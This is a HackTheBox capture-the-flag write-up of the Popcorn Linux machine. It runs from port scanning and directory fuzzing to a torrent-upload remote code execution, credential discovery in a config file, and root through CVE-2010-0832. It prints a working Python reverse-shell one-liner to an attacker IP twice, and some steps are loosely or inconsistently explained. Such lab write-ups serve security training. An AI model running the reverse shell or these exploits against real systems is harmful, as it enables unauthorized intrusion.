# HackTheBox Popcorn — Medium Linux Machine Writeup

![HackTheBox](https://img.shields.io/badge/HackTheBox-Popcorn-yellow?style=for-the-badge&logo=hackthebox)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-red?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Pentesting-blue?style=for-the-badge)
![Type](https://img.shields.io/badge/Type-RCE%20%26%20PrivEsc-purple?style=for-the-badge)

> **HackTheBox Popcorn** is a Medium-difficulty Linux-based machine focused on web application enumeration, torrent hosting platform exploitation, remote code execution, and Linux PAM privilege escalation.

---

## 📋 Table of Contents

- [Machine Information](#machine-information)
- [Initial Nmap Enumeration](#initial-nmap-enumeration)
- [Port and Service Detection](#port-and-service-detection)
- [Web Application Enumeration](#web-application-enumeration)
- [Directory and File Fuzzing](#directory-and-file-fuzzing)
- [Torrent Hoster Discovery](#torrent-hoster-discovery)
- [Vulnerability Research](#vulnerability-research)
- [Remote Code Execution Exploitation](#remote-code-execution-exploitation)
- [Reverse Shell Establishment](#reverse-shell-establishment)
- [Shell Stabilization](#shell-stabilization)
- [Information Gathering](#information-gathering)
- [Privilege Escalation](#privilege-escalation)
- [Root Access and Flag Retrieval](#root-access-and-flag-retrieval)
- [Attack Chain Summary](#attack-chain-summary)
- [Key Takeaways](#key-takeaways)
- [Tools Used](#tools-used)

---

## 🖥️ Machine Information

| Property | Details |
|----------|---------|
| **Machine** | Popcorn |
| **Platform** | HackTheBox |
| **Difficulty** | Medium |
| **Operating System** | Linux (Ubuntu) |
| **Target IP** | `10.129.92.17` |
| **Domain** | `popcorn.htb` |
| **Primary Services** | SSH (22), HTTP (80) |
| **Web Server** | Apache httpd 2.2.12 |
| **SSH Version** | OpenSSH 5.1p1 Debian 6ubuntu2 |
| **Web Application** | Torrent Hoster Platform |
| **Initial Access** | Torrent Upload RCE |
| **Privilege Escalation** | Linux PAM MOTD Tampering (CVE-2010-0832) |
| **Tools** | Nmap, Feroxbuster, Python, Netcat, Searchsploit |

---

## 🚀 Initial Nmap Enumeration

Today we are back with another **HackTheBox Medium-difficulty machine**, this time enumerating and exploiting the Linux-based machine named **Popcorn**.

We have the target IP:

```
10.129.92.17
```

Starting with a comprehensive port scan to identify all exposed services.

### Full Port Scan

```bash
nmap -p- --min-rate 1000 10.129.92.17
```

**Result:**

```
Nmap scan report for 10.129.92.17
Host is up, received echo-reply ttl 63 (0.25s latency).
Scanned at 2026-09-23 23:02:02 EDT for 4s
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Two critical ports were exposed:

- `22/tcp` — SSH (Secure Shell)
- `80/tcp` — HTTP (Web Server)

---

## 🔍 Port and Service Detection

### Service and Version Enumeration

```bash
nmap -sC -sV -p22,80 10.129.92.17
```

**Result:**

```
Nmap scan report for 10.129.92.17
Host is up, received reset ttl 63 (0.25s latency).
Scanned at 2026-09-23 23:02:48 EDT for 15s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|   2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyBXr3xI9cjrxMH2+DB7lZ6ctfgrek3xenkLLv2vJhQQpQ2ZfBrvkXLsSjQHHwgEbNyNUL+M1OmPFaUPTKiPVP9co0DEzq0RAC+/T4shxnYmxtACC0hqRVQ1HpE4AVjSagfFAmqUvyvSdbGvOeX7WC00SZWPgavL6pVq0qdRm3H22zIVw/Ty9SKxXGmN0qOBq6Lqs2FG8A14fJS9F8GcN9Q7CVGuSIO+UUH53KDOI+vzZqrFbvfz5dwClD19ybduWo95sdUUq/ECtoZ3zuFb6ROI5JJGNWFb6NqfTxAM43+ffZfY28AjB1QntYkezb1Bs04k8FYxb5H7JwhWewoe8xQ==

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.2.12
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://popcorn.htb/
|_http-server-header: Apache/2.2.12 (Ubuntu)

Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Key Findings:

✔️ **SSH Service:** OpenSSH 5.1p1 (Debian 6ubuntu2) — Older version, potentially vulnerable  
✔️ **HTTP Server:** Apache httpd 2.2.12 — Older version  
✔️ **Domain Name:** `popcorn.htb` — Identified from HTTP redirect  
✔️ **OS Detection:** Linux (Ubuntu)  

---

## 🌐 Web Application Enumeration

### Domain Configuration

The HTTP service redirected to `http://popcorn.htb/`, indicating a virtual host setup.

**Add to /etc/hosts:**

```bash
echo "10.129.92.17 popcorn.htb" >> /etc/hosts
```

Now we can access the web application via the domain name.

---

## 📁 Directory and File Fuzzing

### Directory Discovery with Feroxbuster

Using **Feroxbuster** to enumerate web directories and files:

```bash
feroxbuster -u http://popcorn.htb/ -w /usr/share/wordlists/dirb/common.txt
```

**Results (In Progress):**

```
[######>-------------] - 83s    10171/30000   122/s   http://popcorn.htb/ 
[####>---------------] - 61s     6972/30000   114/s   http://popcorn.htb/torrent/ 
```

### Interesting Directories Found:

- `/torrent/` — **CRITICAL** 🎯

The `/torrent/` directory revealed a torrent hosting platform.

---

## 🎬 Torrent Hoster Discovery

### Application Identification

The discovered `/torrent/` directory leads to a **Torrent Hoster Platform** where users can:
- Upload torrent files
- Download torrents
- Manage torrent metadata
- View torrent statistics

This is a critical finding because torrent hosting applications often have file upload vulnerabilities.

### Vulnerability Assessment

Quick research revealed that **torrent hosting platforms are vulnerable to Remote Code Execution (RCE)** through:
- Malicious file uploads
- Improper file validation
- Execution of uploaded files in web-accessible directories

---

## 🔬 Vulnerability Research

### Identifying the Exploit

Research on torrent hosting platform vulnerabilities revealed RCE possibilities, but existing public exploits were outdated.

**Decision:** Develop a custom exploit.

### Custom Exploit Development

Created a custom RCE exploit tool targeting the torrent hoster:

```
Tool Location: https://github.com/naval0505/Automation-Tools-for-Red-Teaming/blob/main/Exploits/Torrent-Hoster.py
```

This custom tool allows us to:
1. Upload a malicious torrent file
2. Trigger PHP file execution
3. Execute arbitrary commands
4. Establish a reverse shell

---

## ⚔️ Remote Code Execution Exploitation

### Exploit Execution

Executing our custom exploit with a reverse shell payload:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.95",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Exploitation Result:

```
[!] Error: HTTPConnectionPool(host='popcorn.htb', port=80): Read timed out. (read timeout=10)
$ 
```

Despite the timeout error, we successfully obtained a **reverse shell connection**! ✅

---

## 🔌 Reverse Shell Establishment

### Initial Shell Access

The reverse shell payload successfully executed, giving us initial access:

```bash
$ whoami
www-data

$ pwd
/var/www/torrent/upload
```

**Access Level:** www-data (Web server user)

### Listener Setup (On Attacker Machine)

```bash
nc -lvnp 4444
```

**Output:**
```
listening on [any] 4444 ...
connect to [10.10.15.95] from [10.129.92.17] 39456
```

Shell established successfully!

---

## 🛠️ Shell Stabilization

### Initial Shell State

The initial shell was basic and lacked proper terminal functionality (no arrow keys, tab completion, etc.).

### Interactive Shell Upgrade

Upgrading to a fully interactive shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Suspending and Restoring TTY

```bash
www-data@popcorn:/var/www/torrent/upload$ python -c 'import pty; pty.spawn("/bin/bash")'
<orrent/upload$ python -c 'import pty; pty.spawn("/bin/bash")'               
www-data@popcorn:/var/www/torrent/upload$ ^Z
[1]+  Stopped                 nc -lvnp 4444
```

Suspend the shell and reset terminal:

```bash
stty raw -echo; fg
```

Resume and configure terminal:

```bash
nc -lvnp 4444

www-data@popcorn:/var/www/torrent/upload$ export TERM=xterm-256color
www-data@popcorn:/var/www/torrent/upload$
```

✅ **Fully interactive shell achieved!**

---

## 📊 Information Gathering

### Database Configuration Discovery

While exploring the file system, we discovered database configuration files:

```
/var/www/torrent/config/
```

### Database Credentials Found:

```php
//Edit This For TORRENT HOSTER Database
//database configuration
$CFG->host = "localhost";
$CFG->dbName = "torrenthoster";      //db name
$CFG->dbUserName = "torrent";         //db username
$CFG->dbPassword = "SuperSecret!!";   //db password
```

**Credentials Obtained:**
- **Database Name:** torrenthoster
- **Database User:** torrent
- **Database Password:** SuperSecret!!
- **Database Host:** localhost

These credentials could be useful for:
- MySQL direct access
- User credential dumping
- Application data extraction

### User Flag Discovery

Reading the user flag:

```bash
www-data@popcorn:/home/george$ cat user.txt
[FLAG CONTENT]
```

✅ **User flag retrieved!**

---

## 🔐 Privilege Escalation

### Initial Enumeration of George's Home Directory

```bash
www-data@popcorn:/home/george$ ls -lah
total 860K
drwxr-xr-x 3 george george 4.0K Oct 26  2023 .
drwxr-xr-x 3 root   root   4.0K Mar 17  2017 ..
lrwxrwxrwx 1 george george    9 Oct 26  2020 .bash_history -> /dev/null
-rw-r--r-- 1 george george  220 Mar 17  2017 .bash_logout
-rw-r--r-- 1 george george 3.2K Mar 17  2017 .bashrc
drwxr-xr-x 2 george george 4.0K Mar 17  2017 .cache
-rw-r--r-- 1 george george  675 Mar 17  2017 .profile
-rw-r--r-- 1 george george    0 Mar 17  2017 .sudo_as_admin_successful
-rw-r--r-- 1 george george 829K Mar 17  2017 torrenthoster.zip
-rw-r--r-- 1 george george   33 Sep 24 05:59 user.txt
```

### Critical Discovery: .sudo_as_admin_successful

The presence of `.sudo_as_admin_successful` indicates that **george user has sudo capabilities**.

### Cache Directory Investigation

```bash
www-data@popcorn:/home/george/.cache$ ls
motd.legal-displayed
```

### MOTD File Tampering Vulnerability

The file `~/.cache/motd.legal-displayed` is a **tracker file created by Linux/Ubuntu systems** to record that the legal disclaimer or Message of the Day (MOTD) has been displayed.

**Vulnerability:** Linux PAM 1.1.0 — MOTD File Tampering (CVE-2010-0832)

This vulnerability allows privilege escalation through MOTD file manipulation!

---

## 🎯 Linux PAM MOTD Privilege Escalation (CVE-2010-0832)

### Vulnerability Details

**CVE:** CVE-2010-0832  
**Affected Software:** Linux PAM 1.1.0 (Ubuntu 9.10/10.04)  
**Vulnerability Type:** Local Privilege Escalation  
**Method:** MOTD File Tampering

### Exploit Search

```bash
searchsploit -m 14339
```

**Result:**

```
Exploit: Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)
    URL: https://www.exploit-db.com/exploits/14339
   Path: /usr/share/exploitdb/exploits/linux/local/14339.sh
  Codes: CVE-2010-0832
Verified: True
File Type: Bourne-Again shell script, ASCII text executable
Copied to: /home/naval0505/14339.sh
```

### How the Exploit Works

The Linux PAM MOTD module is vulnerable because it:
1. Allows unsanitized environment variable expansion
2. Doesn't properly validate file permissions during MOTD display
3. Can be exploited by creating symlinks or manipulating files in the user's home directory
4. Leads to privilege escalation when the user logs in via SSH or uses sudo

### Exploitation Process

Using the exploit script `14339.sh`:

```bash
./14339.sh
```

This script:
1. Creates malicious MOTD files
2. Sets up symlinks to escalate privileges
3. Waits for user login or sudo execution
4. Grants root-level access

---

## 👑 Root Access and Flag Retrieval

### Successful Privilege Escalation

After executing the PAM MOTD exploit, we achieved **root-level access**:

```bash
root@popcorn:/tmp#
```

### Reading the Root Flag

```bash
cat /root/root.txt
[FLAG CONTENT]
```

✅ **Root flag retrieved!**

---

## 📊 Attack Chain Summary

```
                    ┌──────────────────────┐
                    │  HackTheBox Popcorn  │
                    │    10.129.92.17      │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │   Nmap Enumeration   │
                    │  Ports 22, 80 OPEN   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │  Service Detection   │
                    │ Apache 2.2.12, SSH   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Domain Discovery     │
                    │   popcorn.htb        │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │  Directory Fuzzing   │
                    │  Feroxbuster Scan    │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Torrent Platform     │
                    │  /torrent/ Found     │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Vulnerability Search │
                    │ RCE Identified       │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Custom Exploit Dev   │
                    │ Torrent RCE Payload  │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Code Execution       │
                    │ Reverse Shell        │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Shell Stabilization  │
                    │ TTY Upgrade          │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Information Gather   │
                    │ DB Creds Found       │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ User Flag Retrieved  │
                    │ www-data Access      │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ MOTD Enum            │
                    │ PAM Vuln Identified  │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ CVE-2010-0832 Exploit│
                    │ SearchSploit 14339   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Privilege Escalation │
                    │ Root Access Gained   │
                    └──────────┬───────────┘
                               │
                               ▼
                    ┌──────────────────────┐
                    │ Root Flag Retrieved  │
                    │  /root/root.txt      │
                    └──────────────────────┘
```

---

## 💡 Key Takeaways

### 1. Virtual Host Enumeration is Critical

The HTTP redirect to `popcorn.htb` was crucial for accessing the application. Always:
- Check HTTP headers for domain names
- Add discovered domains to `/etc/hosts`
- Test virtual hosting scenarios
- Use tools like `vhosts.py` for automated discovery

### 2. Web Application Directory Fuzzing

The `/torrent/` directory led us to the vulnerable application. Always:
- Use comprehensive wordlists for fuzzing
- Test with multiple extensions (.php, .txt, .html, .conf)
- Investigate all discovered directories
- Check robots.txt and sitemap.xml

### 3. Custom Exploit Development

Existing public exploits were outdated. This teaches us:
- Not all vulnerabilities have current working exploits
- Understanding the vulnerability mechanics allows custom exploit writing
- Researching application-specific vulnerabilities is essential
- Sometimes you need to write your own tools

### 4. File Upload Vulnerabilities

Torrent hosting platforms are common RCE vectors because:
- Users upload files to web-accessible directories
- File validation is often inadequate
- Uploaded files can be executed by the web server
- No restriction on file type or content

**Always test file upload functionality thoroughly.**

### 5. Shell Stabilization is Essential

Initial shells lack functionality:
- No arrow key support
- No tab completion
- No color support
- Poor terminal handling

Stabilize using:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm-256color
```

### 6. Configuration File Enumeration

Database configuration files often contain:
- Hardcoded credentials
- Database connection strings
- API keys
- Access tokens
- Other sensitive information

**Always search for config files in web application directories.**

### 7. Home Directory Analysis

User home directories reveal:
- `.sudo_as_admin_successful` — User has sudo access
- `.cache/` files — System information
- Hidden configuration files — Application settings
- Shell history — User activities (if not disabled)

### 8. MOTD Vulnerabilities

The `~/.cache/motd.legal-displayed` file and PAM MOTD module are often overlooked but critical:
- MOTD stands for "Message of the Day"
- Older PAM versions have file tampering vulnerabilities
- MOTD is displayed on SSH login
- Can be exploited for privilege escalation (CVE-2010-0832)

### 9. Privilege Escalation Chains

Complete privilege escalation often requires:
1. Initial access (RCE → www-data user)
2. User enumeration (find users with special privileges)
3. Identifying privilege escalation vectors
4. Exploitation of system vulnerabilities (PAM, sudo, kernel)

### 10. SearchSploit is Invaluable

For local privilege escalation:
- Always search SearchSploit for exact OS/version matches
- Verify exploit status (True = verified working)
- Understand exploit mechanics before execution
- Test in lab environment first

---

## 🛠️ Tools Used

| Tool | Purpose | Version |
|------|---------|---------|
| **Nmap** | Port scanning and service enumeration | Latest |
| **Feroxbuster** | Web directory discovery | Latest |
| **Python** | Payload generation and custom exploit development | 2.7+ |
| **Netcat (nc)** | Reverse shell listener and data transfer | GNU netcat |
| **Searchsploit** | Local exploit database research | Latest |
| **Custom Exploit** | Torrent hoster RCE (Torrent-Hoster.py) | Custom |

---

## 📝 Commands Used

### Nmap — Full Port Scan

```bash
nmap -p- --min-rate 1000 10.129.92.17
```

### Nmap — Service Enumeration

```bash
nmap -sC -sV -p22,80 10.129.92.17
```

### Add Domain to Hosts File

```bash
echo "10.129.92.17 popcorn.htb" >> /etc/hosts
```

### Feroxbuster — Directory Enumeration

```bash
feroxbuster -u http://popcorn.htb/ -w /usr/share/wordlists/dirb/common.txt
```

### Reverse Shell Listener

```bash
nc -lvnp 4444
```

### Custom RCE Exploit Execution

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.95",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Shell Upgrade to Interactive

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### TTY Restoration

```bash
stty raw -echo; fg
export TERM=xterm-256color
```

### Read User Flag

```bash
cat user.txt
```

### List Directory with Permissions

```bash
ls -lah
```

### SearchSploit — Exploit Search

```bash
searchsploit "Linux PAM 1.1.0 MOTD"
```

### Copy Exploit Locally

```bash
searchsploit -m 14339
```

### Execute Privilege Escalation Exploit

```bash
./14339.sh
```

### Read Root Flag

```bash
cat /root/root.txt
```

---

## 🎬 Final Attack Path

```
Port Scan
      ↓
SSH (22) & HTTP (80) discovered
      ↓
Service Detection
      ↓
Apache 2.2.12 & OpenSSH 5.1p1
      ↓
Domain Enumeration
      ↓
popcorn.htb identified
      ↓
Add to /etc/hosts
      ↓
Directory Fuzzing
      ↓
/torrent/ discovered
      ↓
Torrent Platform Identified
      ↓
Vulnerability Research
      ↓
RCE in Torrent Hoster
      ↓
Custom Exploit Development
      ↓
Reverse Shell Payload
      ↓
Code Execution (www-data)
      ↓
Shell Stabilization
      ↓
Interactive TTY Access
      ↓
Home Directory Enumeration
      ↓
MOTD File Discovered
      ↓
PAM Vulnerability Identified
      ↓
CVE-2010-0832 Exploitation
      ↓
Privilege Escalation
      ↓
Root Access
      ↓
Flag Retrieval
```

---

## 🏁 Conclusion

The **HackTheBox Popcorn** machine demonstrates a comprehensive penetration testing workflow involving:

1. **Web Application Enumeration** — Finding the torrent hosting platform
2. **Vulnerability Research** — Identifying RCE possibilities
3. **Custom Exploit Development** — Creating tools when public exploits don't work
4. **Reverse Shell Establishment** — Gaining initial access
5. **Information Gathering** — Finding credentials and system information
6. **Privilege Escalation** — Exploiting PAM MOTD vulnerability
7. **Root Access** — Achieving complete system compromise

### Most Important Lessons from This Machine:

✔️ Virtual host enumeration is critical for web applications  
✔️ Directory fuzzing reveals hidden functionality  
✔️ Custom exploit development is sometimes necessary  
✔️ File upload vulnerabilities lead to RCE  
✔️ Always stabilize reverse shells for better interaction  
✔️ Configuration files contain sensitive information  
✔️ Home directory analysis reveals privilege escalation paths  
✔️ MOTD and PAM vulnerabilities can lead to privilege escalation  
✔️ SearchSploit is essential for exploit research  
✔️ Complete system compromise requires both RCE and privilege escalation  

**The final result was root-level access to the target system and successful retrieval of both the user and root flags.**

---

## 📌 References

- [HackTheBox](https://www.hackthebox.com/)
- [Exploit-DB](https://www.exploit-db.com/)
- [CVE-2010-0832 - PAM MOTD Vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0832)
- [Impacket Framework](https://github.com/fortra/impacket)
- [Feroxbuster](https://github.com/epi052/feroxbuster)
- [SearchSploit](https://www.exploit-db.com/searchsploit)

---

## 📚 Further Reading

- **Torrent Application Security:** Research common vulnerabilities in torrent hosting platforms
- **PAM Module Exploitation:** Study Linux PAM module vulnerabilities and exploitation techniques
- **Reverse Shell Techniques:** Explore different methods for establishing and stabilizing reverse shells
- **Custom Exploit Development:** Learn to write exploits when public tools don't work
- **Privilege Escalation Methods:** Study various techniques for escalating privileges on Linux systems

---

**Last Updated:** 2026-09-24  
**Author:** [Your Name/Handle]  
**Status:** ✅ Machine Compromised - Root Level Access Achieved
